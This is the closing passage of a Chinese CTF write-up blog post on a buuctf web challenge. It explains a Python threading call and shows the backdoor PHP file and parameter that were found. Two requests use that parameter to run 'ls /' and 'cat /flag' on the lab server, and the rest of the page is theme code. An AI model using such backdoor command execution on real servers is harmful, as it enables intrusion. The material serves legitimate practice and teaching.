<p>这段代码创建了一个线程对象，该线程对象的目标函数是 <code>get_content</code> ，并传入了一个参数 <code>i</code>  作为参数。 <code>get_content</code>  函数是线程执行的目标函数，而 <code>args=(i,)</code>  是将参数 <code>i</code>  作为元组传递给 <code>get_content</code>  函数。这样，当线程开始执行时，它会调用 <code>get_content(i)</code>  函数。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/c07.png" alt></p>
<p>利用文件：  <code>xk0SzyKwfzw.php</code> ，利用的参数： <code>Efa5BVG</code></p>
<p>接下来就是利用这个文件和参数获取 flag 了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xk0SzyKwfzw.php?Efa5BVG=ls%20/;</span><br></pre></td></tr></table></figure>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/c08.png" alt></p>
<p><code>ls;</code>  访问当前目录， <code>ls \;</code>  访问上一级， <code>%20</code>  是 url 编码，这题直接用空格也是可以的，看到 flag 文件直接获取就行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xk0SzyKwfzw.php?Efa5BVG=cat /flag;</span><br></pre></td></tr></table></figure>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/c09.png" alt></p>

<div class="article-footer fs14">
    <section id="license">
      <div class="header"><span>许可协议</span></div>
      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名 - 非商业性使用 - 相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
</div>
    </section>
    </div>
</article>
<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2024/02/15/hgame2024-week1-Select-Courses%E6%8A%A2%E8%AF%BE%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99%E5%AD%A6%E4%B9%A0/">hgame2024_week1_Select_Courses抢课脚本编写学习</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2024/01/24/buuctf%E5%88%B7%E9%A2%982/">buuctf刷题2</a></div></section></div>






<footer class="page-footer footnote"><hr><div class="text"><p>本站由 <a href="/">Dr4x3zz</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.29.1">Stellar 1.29.1</a> 主题创建。<br>
本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
</div></footer>
<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
<div class="widgets">



<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#roarctf-2019easy-java"><span class="toc-text"> [RoarCTF 2019]Easy Java</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2018fakebook"><span class="toc-text"> [网鼎杯 2018] Fakebook</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bjdctf2020the-mystery-of-ip"><span class="toc-text"> [BJDCTF2020]The mystery of ip</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84phpweb"><span class="toc-text"> [网鼎杯 2020 朱雀组] phpweb</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bsidescf-2020had-a-bad-day"><span class="toc-text"> [BSidesCF 2020]Had a bad day</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bjdctf2020zjctf%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4"><span class="toc-text"> [BJDCTF2020] ZJCTF，不过如此</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gxyctf2019%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83"><span class="toc-text"> [GXYCTF2019] 禁止套娃</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nctf2019fake-xml-cookbook"><span class="toc-text"> [NCTF2019]Fake XML cookbook</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gwctf-2019%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text"> [GWCTF 2019] 我有一个数据库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bjdctf2020mark-loves-cat"><span class="toc-text"> [BJDCTF2020]Mark loves cat</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#wustctf2020%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E"><span class="toc-text"> [WUSTCTF2020] 朴实无华</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bjdctf2020cookie-is-so-stable"><span class="toc-text"> [BJDCTF2020]Cookie is so stable</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E6%B4%B5%E6%9D%AF-2019easy_web"><span class="toc-text"> [安洵杯 2019] easy_web</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mrctf2020ezpop"><span class="toc-text"> [MRCTF2020]Ezpop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-2019%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2"><span class="toc-text"> [强网杯 2019] 高明的黑客</span></a></li></ol></div><div class="widget-footer">

<a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a></div></widget>
</div></aside><div class='float-panel blur'>
  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
  </button>
  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
  </button>
</div>
</div><div class="scripts">
<script type="text/javascript">
  const ctx = {
    date_suffix: {
      just: `刚刚`,
      min: `分钟前`,
      hour: `小时前`,
      day: `天前`,
    },
    root : `/`,
  };

  // required plugins (only load if needs)
  if (`local_search`) {
    ctx.search = {};
    ctx.search.service = `local_search`;
    if (ctx.search.service == 'local_search') {
      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"skip_search":null,"sort":"-date"}`);
      ctx.search[ctx.search.service] = service_obj;
    }
  }
  const def = {
    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
  };
  const deps = {
    jquery: `https://cdn.jsdelivr.net/npm/jquery@3.7.1/dist/jquery.min.js`,
    marked: `https://cdn.jsdelivr.net/npm/marked@13.0.1/lib/marked.umd.min.js`
  }
  

</script>

<script type="text/javascript">
  const utils = {
    // 懒加载 css https://github.com/filamentgroup/loadCSS
    css: (href, before, media, attributes) => {
      var doc = window.document;
      var ss = doc.createElement("link");
      var ref;
      if (before) {
        ref = before;
      } else {
        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
        ref = refs[refs.length - 1];
      }
      var sheets = doc.styleSheets;
      if (attributes) {
        for (var attributeName in attributes) {
          if (attributes.hasOwnProperty(attributeName)) {
            ss.setAttribute(attributeName, attributes[attributeName]);
          }
        }
      }
      ss.rel = "stylesheet";
      ss.href = href;
      ss.media = "only x";
      function ready(cb) {
        if (doc.body) {
          return cb();
        }
        setTimeout(function () {
          ready(cb);
        });
      }
      ready(function () {
        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
      });
      var onloadcssdefined = function (cb) {
        var resolvedHref = ss.href;
        var i = sheets.length;
        while (i--) {
          if (sheets[i].href === resolvedHref) {
            return cb();
          }
        }
        setTimeout(function () {
          onloadcssdefined(cb);
        });
      };
      function loadCB() {
        if (ss.addEventListener) {
          ss.removeEventListener("load", loadCB);
        }
        ss.media = media || "all";
      }
      if (ss.addEventListener) {
        ss.addEventListener("load", loadCB);
      }
      ss.onloadcssdefined = onloadcssdefined;
      onloadcssdefined(loadCB);
      return ss;
    },

    js: (src, opt) => new Promise((resolve, reject) => {
      var script = document.createElement('script');
      if (src.startsWith('/')){
        src = ctx.root + src.substring(1);
      }
      script.src = src;
      if (opt) {
        for (let key of Object.keys(opt)) {
          script[key] = opt[key]
        }
      } else {
        // 默认异步，如果需要同步，第二个参数传入 {} 即可
        script.async = true
      }
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    }),

    jq: (fn) => {
      if (typeof jQuery === 'undefined') {
        utils.js(deps.jquery).then(fn)
      } else {
        fn()
      }
    },
    
    onLoading: (el) => {
      if (el) {
        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
      }
    },
    onLoadSuccess: (el) => {
      if (el) {
        $(el).find('.loading-wrap').remove();
      }
    },
    onLoadFailure: (el) => {
      if (el) {
        $(el).find('.loading-wrap svg').remove();
        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
        $(el).find('.loading-wrap').addClass('error');
      }
    },
    request: (el, url, callback, onFailure) => {
      let retryTimes = 3;
      utils.onLoading(el);
      function req() {
        return new Promise((resolve, reject) => {
          let status = 0; // 0 等待 1 完成 2 超时
          let timer = setTimeout(() => {
            if (status === 0) {
              status = 2;
              timer = null;
              reject('请求超时');
              if (retryTimes == 0) {
                onFailure();
              }
            }
          }, 5000);
          fetch(url).then(function(response) {
            if (status !== 2) {
              clearTimeout(timer);
              resolve(response);
              timer = null;
              status = 1;
            }
            if (response.ok) {
              return response.json();
            }
            throw new Error('Network response was not ok.');
          }).then(function(data) {
            retryTimes = 0;
            utils.onLoadSuccess(el);
            callback(data);
          }).catch(function(error) {
            if (retryTimes > 0) {
              retryTimes -= 1;
              setTimeout(() => {
                req();
              }, 5000);
            } else {
              utils.onLoadFailure(el);
              onFailure();
            }
          });
        });
      }
      req();
    },
  };
</script>

<script>
  const sidebar = {
    leftbar: () => {
      if (l_body) {
        l_body.toggleAttribute('leftbar');
        l_body.removeAttribute('rightbar');
      }
    },
    rightbar: () => {
      if (l_body) {
        l_body.toggleAttribute('rightbar');
        l_body.removeAttribute('leftbar');
      }
    },
    dismiss: () => {
      if (l_body) {
        l_body.removeAttribute('leftbar');
        l_body.removeAttribute('rightbar');
      }
    },
    toggleTOC: () => {
      document.querySelector('#data-toc').classList.toggle('collapse');
    }
  }
</script>
<script type="text/javascript">
  (() => {
    const tagSwitchers = document.querySelectorAll('.tag-subtree.parent-tag > a > .tag-switcher-wrapper')
    for (const tagSwitcher of tagSwitchers) {
      tagSwitcher.addEventListener('click', (e) => {
        const parent = e.target.closest('.tag-subtree.parent-tag')
        parent.classList.toggle('expanded')
        e.preventDefault()
      })
    }

    // Get active tag from query string, then activate it.
    const urlParams = new URLSearchParams(window.location.search)
    const activeTag = urlParams.get('tag')
    if (activeTag) {
      let tag = document.querySelector(`.tag-subtree[data-tag="${activeTag}"]`)
      if (tag) {
        tag.querySelector('a').classList.add('active')
        
        while (tag) {
          tag.classList.add('expanded')
          tag = tag.parentElement.closest('.tag-subtree.parent-tag')
        }
      }
    }
  })()
</script>


<!-- required -->
<script src="/js/main.js?v=1.29.1" defer></script>

<script type="text/javascript">
  const applyTheme = (theme) => {
    if (theme === 'auto') {
      document.documentElement.removeAttribute('data-theme')
    } else {
      document.documentElement.setAttribute('data-theme', theme)
    }

    applyThemeToGiscus(theme)
  }

  const applyThemeToGiscus = (theme) => {
    theme = theme === 'auto' ? 'preferred_color_scheme' : theme

    const cmt = document.getElementById('giscus')
    if (cmt) {
      // This works before giscus load.
      cmt.setAttribute('data-theme', theme)
    }

    const iframe = document.querySelector('#comments > section.giscus > iframe')
    if (iframe) {
      // This works after giscus loaded.
      const src = iframe.src
      const newSrc = src.replace(/theme=[\w]+/, `theme=${theme}`)
      iframe.src = newSrc
    }
  }

  const switchTheme = () => {
    // light -> dark -> auto -> light -> ...
    const currentTheme = document.documentElement.getAttribute('data-theme')
    let newTheme;
    switch (currentTheme) {
      case 'light':
        newTheme = 'dark'
        break
      case 'dark':
        newTheme = 'auto'
        break
      default:
        newTheme = 'light'
    }
    applyTheme(newTheme)
    window.localStorage.setItem('Stellar.theme', newTheme)

    const messages = {
      light: `切换到浅色模式`,
      dark: `切换到深色模式`,
      auto: `切换到跟随系统配色`,
    }
    hud?.toast?.(messages[newTheme])
  }

  (() => {
    // Apply user's preferred theme, if any.
    const theme = window.localStorage.getItem('Stellar.theme')
    if (theme !== null) {
      applyTheme(theme)
    }
  })()
</script>


<!-- optional -->



<script defer>
  window.addEventListener('DOMContentLoaded', (event) => {
    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"},"twikoo":{"js":"/js/services/twikoo_latest_comment.js"},"waline":{"js":"/js/services/waline_latest_comment.js"},"artalk":{"js":"/js/services/artalk_latest_comment.js"},"giscus":{"js":"/js/services/giscus_latest_comment.js"}}`));
    for (let id of Object.keys(ctx.services)) {
      const js = ctx.services[id].js;
      if (id == 'siteinfo') {
        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
        if (ctx.cardlinks?.length > 0) {
          utils.js(js, { defer: true }).then(function () {
            setCardLink(ctx.cardlinks);
          });
        }
      } else {
        const els = document.getElementsByClassName(`ds-${id}`);
        if (els?.length > 0) {
          utils.jq(() => {
            if (id == 'timeline' || 'memos' || 'marked') {
              utils.js(deps.marked).then(function () {
                utils.js(js, { defer: true });
              });
            } else {
              utils.js(js, { defer: true });
            }
          });
        }
      }
    }
  });
</script>

<script>
  window.addEventListener('DOMContentLoaded', (event) => {
    ctx.search = {
      path: `/search.json`,
    }
    utils.js('/js/search/local-search.js', { defer: true });
  });
</script><script>
  window.FPConfig = {
    delay: 0,
    ignoreKeywords: [],
    maxRPS: 5,
    hoverDelay: 25
  };
</script>
<script defer src="https://cdn.jsdelivr.net/npm/flying-pages@2/flying-pages.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@19.1.3/dist/lazyload.min.js"></script>
<script>
  // https://www.npmjs.com/package/vanilla-lazyload
  // Set the options globally
  // to make LazyLoad self-initialize
  window.lazyLoadOptions = {
    elements_selector: ".lazy",
  };
  // Listen to the initialization event
  // and get the instance of LazyLoad
  window.addEventListener(
    "LazyLoad::Initialized",
    function (event) {
      window.lazyLoadInstance = event.detail.instance;
    },
    false
  );
  document.addEventListener('DOMContentLoaded', function () {
    window.lazyLoadInstance?.update();
  });
</script><script>
  ctx.fancybox = {
    selector: `.timenode p>img`,
    css: `https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.css`,
    js: `https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.umd.js`
  };
  var selector = '[data-fancybox]:not(.error)';
  if (ctx.fancybox.selector) {
    selector += `, ${ctx.fancybox.selector}`
  }
  var needFancybox = document.querySelectorAll(selector).length !== 0;
  if (!needFancybox) {
    const els = document.getElementsByClassName('ds-memos');
    if (els != undefined && els.length > 0) {
      needFancybox = true;
    }
  }
  if (needFancybox) {
    utils.css(ctx.fancybox.css);
    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
      Fancybox.bind(selector, {
        hideScrollbar: false,
        Thumbs: {
          autoStart: false,
        },
        caption: (fancybox, slide) => {
          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
        }
      });
    })
  }
</script>
<script>
  window.addEventListener('DOMContentLoaded', (event) => {
    const swiper_api = document.getElementById('swiper-api');
    if (swiper_api != undefined) {
      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
        const effect = swiper_api.getAttribute('effect') || '';
        var swiper = new Swiper('.swiper#swiper-api', {
          slidesPerView: 'auto',
          spaceBetween: 8,
          centeredSlides: true,
          effect: effect,
          rewind: true,
          pagination: {
            el: '.swiper-pagination',
            clickable: true,
          },
          navigation: {
            nextEl: '.swiper-button-next',
            prevEl: '.swiper-button-prev',
          },
        });
      })
    }
  });
</script>
<script>
  document.addEventListener('DOMContentLoaded', function () {
    window.codeElements = document.querySelectorAll('.code');
    if (window.codeElements.length > 0) {
      ctx.copycode = {
        default_text: `Copy`,
        success_text: `Copied`,
        toast: `复制成功`,
      };
      utils.js('/js/plugins/copycode.js');
    }
  });
</script>


<!-- inject -->

</div></body></html>
